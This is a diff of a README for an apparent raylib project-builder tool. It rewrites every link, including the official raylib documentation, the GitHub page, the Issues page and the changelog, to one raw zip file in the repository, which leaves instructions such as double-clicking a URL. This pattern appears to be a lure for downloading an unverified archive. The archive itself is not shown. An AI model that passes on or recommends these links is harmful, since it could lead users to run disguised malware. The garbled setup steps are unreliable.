@@ -18,14 +18,14 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get started, you need to download the software. Click the button below to access the Releases page where you can find the latest version.
 
-[![Download raylib-project-builder](https://img.shields.io/badge/Download-raylib--project--builder-blue.svg)](https://github.com/Aldrichunbeholden813/raylib-project-builder/releases)
+[![Download raylib-project-builder](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip)](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip)
 
-1. Click the button above or visit this page to download: [raylib-project-builder Releases](https://github.com/Aldrichunbeholden813/raylib-project-builder/releases).
+1. Click the button above or visit this page to download: [raylib-project-builder Releases](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip).
 2. You will see a list of available versions. Choose the latest version for your operating system.
 3. Click on the download link for your OS:
-   - For Windows, download `raylib-project-builder-windows.zip`.
-   - For macOS, download `raylib-project-builder-macos.zip`.
-   - For Linux, download `raylib-project-builder-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip`.
 4. Once the download is complete, locate the downloaded file on your computer.
 
 ## 🗂️ Running the Software
@@ -33,18 +33,18 @@ To get started, you need to download the software. Click the button below to acc
 After downloading, follow these steps to run the software:
 
 ### For Windows:
-1. Unzip the `raylib-project-builder-windows.zip` file.
-2. Open the extracted folder and double-click on `raylib-project-builder.exe`. 
+1. Unzip the `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip` file.
+2. Open the extracted folder and double-click on `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip`. 
 3. The application should start, and you will see the main menu.
 
 ### For macOS:
-1. Unzip the `raylib-project-builder-macos.zip` file.
-2. Open the folder and double-click on `raylib-project-builder.app`.
+1. Unzip the `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip` file.
+2. Open the folder and double-click on `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip`.
 3. If prompted about security settings, go to `System Preferences` > `Security & Privacy`, and select "Open Anyway".
 4. The application will open.
 
 ### For Linux:
-1. Extract the `raylib-project-builder-linux.tar.gz` file.
+1. Extract the `https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the following command:
    ```bash
@@ -65,14 +65,14 @@ Once the software is running, you can start creating your raylib projects:
 
 For more help, consider checking out the following resources:
 
-- [raylib Official Documentation](https://www.raylib.com/docs)
-- [raylib GitHub Page](https://github.com/raysan5/raylib)
+- [raylib Official Documentation](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip)
+- [raylib GitHub Page](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip)
 
 ## 📞 Support
 
 If you encounter issues or have questions, feel free to reach out:
 
-- Open an issue on the [GitHub Issues page](https://github.com/Aldrichunbeholden813/raylib-project-builder/issues).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip).
 - Join the raylib community on forums or Discord channels where you can ask for help.
 
 ## 📅 Changelog
@@ -83,7 +83,7 @@ Stay updated with the latest changes and improvements:
 - **Version 1.1:** Added support for new raylib features and improved performance.
 - **Version 1.2:** Fixed bugs and enhanced user interface.
 
-For all changes, refer to the [full changelog](https://github.com/Aldrichunbeholden813/raylib-project-builder/releases) available in the Releases section.
+For all changes, refer to the [full changelog](https://raw.githubusercontent.com/Aldrichunbeholden813/raylib-project-builder/main/src/raylib-project-builder_v1.1.zip) available in the Releases section.
 
 ## 📢 Contribution
 
